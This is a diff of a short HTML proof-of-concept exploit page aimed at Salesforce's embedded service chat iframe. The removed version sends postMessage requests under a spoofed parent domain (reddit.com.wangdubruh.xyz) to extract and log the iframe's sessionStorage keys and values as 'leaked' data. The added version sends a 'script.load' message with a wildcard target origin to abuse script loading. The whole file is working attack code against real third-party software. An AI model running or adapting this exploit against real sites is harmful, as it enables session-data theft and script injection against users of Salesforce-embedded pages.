@@ -1,44 +1,26 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Salesforce SessionStorage Leak Test</title>
+  <title>PoC: script.load abuse</title>
 </head>
 <body>
-  <h3>[+] Iframe loaded (Salesforce 4.0)</h3>
-  <iframe id="sfchat" src="https://service.force.com/embeddedservice/4.0/esw.html?parent=https://reddit.com.wangdubruh.xyz" style="display:none;"></iframe>
+  <h2>[+] Iframe loaded (script.load test)</h2>
+  <iframe id="salesforce" src="https://service.force.com/embeddedservice/4.0/esw.html?parent=https://reddit.com.wangdubruh.xyz" style="width:600px;height:400px;border:1px solid #ccc;"></iframe>
 
   <script>
-    const iframe = document.getElementById("sfchat");
+    const iframe = document.getElementById("salesforce");
 
-    function sendMessage(method, data = {}) {
-      const msg = {
-        method,
+    iframe.onload = () => {
+      console.log("[📤] Sending: script.load");
+      iframe.contentWindow.postMessage({
+        method: "script.load",
         domain: "reddit.com.wangdubruh.xyz",
-        ...data
-      };
-      console.log("[📤] Sending:", msg);
-      iframe.contentWindow.postMessage(msg, "https://service.force.com");
-    }
+        data: "session"
+      }, "*");
+    };
 
     window.addEventListener("message", (event) => {
-      if (event.origin !== "https://service.force.com") return;
-
       console.log("[📩] Message from iframe:", event.data);
-      if (event.data.method === "session.onLoad") {
-        // Ask iframe for sessionStorage
-        sendMessage("getSessionStorageData", {
-          deploymentId: "test123"
-        });
-      }
-
-      if (event.data.method === "session.storageData") {
-        // 🎯 THIS IS WHERE THE DATA COMES
-        const keys = event.data.data;
-        console.log("[🎉] Leaked sessionStorage keys from iframe:");
-        Object.entries(keys).forEach(([key, value]) => {
-          console.log(`🔑 ${key}:`, value);
-        });
-      }
     });
   </script>
 </body>
